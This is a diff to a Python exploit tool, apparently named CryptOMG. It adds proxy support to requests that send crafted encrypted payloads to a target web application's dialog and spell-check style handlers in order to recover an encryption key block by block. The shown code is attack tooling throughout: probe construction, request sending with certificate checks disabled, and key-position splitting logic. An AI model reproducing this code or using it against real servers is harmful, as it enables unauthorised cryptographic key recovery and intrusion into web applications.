@@ -42,7 +42,7 @@ def is_valid_partial_key(partilKey):
 
 class CryptOMG():
 
-    def __init__(self,debug=False,url='',handler="DH",cookie=None,knownkey='',version=None,resume=None,length=48,terminal=None,mthlock=None):
+    def __init__(self,debug=False,url='',handler="DH",cookie=None,knownkey='',version=None,resume=None,length=48,proxy=None,terminal=None,mthlock=None):
     
         self.solved_blocks = []
         self.current_pos = 0
@@ -66,6 +66,8 @@ class CryptOMG():
         self.length = length
         self.exploit_url = ""
         self.findKeyComplete = False
+
+        self.proxies = {'http':proxy,'https':proxy}
 
         if knownkey:
 
@@ -161,7 +163,7 @@ class CryptOMG():
 
         self.request_count += 1
         self.terminal.footer_draw()
-        r = requests.get(fullurl,headers=headers,verify=False)
+        r = requests.get(fullurl,headers=headers,verify=False,proxies=self.proxies)
         self.msgPrint(f"Sent version for version {version}. Resulting code: [{r.status_code}] Response Size: [{len(r.content)}] (Total request count: [{self.request_count}])",style="debug")
         return r
 
@@ -221,14 +223,14 @@ class Block():
             else:
                 fullUrl = f'{str(self.url)}?dp={base64.b64encode((encryptedPrefix + randBytes)).decode()}'
 
-            r = requests.get(fullUrl,headers=headers,verify=False)
+            r = requests.get(fullUrl,headers=headers,verify=False,proxies=self.proxies)
 
 
         elif self.parent.handler == "SP":
 
             fullUrl = f'{str(self.url)}'
             data = {"DictionaryLanguage":"en-US","Configuration":base64.b64encode((encryptedPrefix + randBytes)).decode()}
-            r = requests.post(fullUrl,headers=headers,data=data,verify=False)
+            r = requests.post(fullUrl,headers=headers,data=data,verify=False,proxies=self.proxies)
 
         else:
             self.parent.msgPrint("Invalid Handler Type!",style="error")
@@ -354,16 +356,12 @@ class KeyPosition():
             while 1:
                 self.parent.parent.terminal.possible_values_draw()
                 split_dict,distance_dict = self.findSplittingProbe()
-
                 sorted_dict = sorted(distance_dict.items(), key=lambda x:x[1])
-
 
                 for distance_tuple in sorted_dict:
                     fullprobe_list = list(self.parent.baseline)
                     intProbe = int(distance_tuple[0])
                     self.parent.parent.msgPrint(f"Trying probe: {[int(distance_tuple[0])]} which has a split distance of {[distance_tuple[1]]}",style="debug")
-                   # msgPrint(f"Positive Bucket [{split_dict[intProbe][0]}]")
-                  #  msgPrint(f"Negative Bucket [{split_dict[intProbe][1]}]")
                    
                     if self.pos == 1:
                         fullprobe_list[0] = intProbe
